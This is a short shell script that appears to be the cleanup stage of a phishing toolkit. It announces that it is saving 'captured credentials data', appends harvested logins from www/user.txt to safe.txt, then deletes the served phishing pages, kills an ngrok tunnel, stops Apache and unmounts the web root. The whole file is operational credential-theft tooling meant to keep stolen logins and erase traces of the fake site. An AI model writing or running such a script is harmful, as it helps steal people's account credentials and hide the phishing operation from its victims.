#!/bin/sh
echo "\n\n"Closing...
echo Saving captured credentials data to safe.txt...
f=www/user.txt
chmod 766 safe.txt
if test -f "$f"
then
	cat $f >> safe.txt
	echo Saved.
else
	echo No new data found.
fi
echo Shutting down server...
rm -rf www/*
killall -q ngrok
service apache2 stop
umount -q /var/www/html
chmod 755 shell/* safe.txt
echo Done.
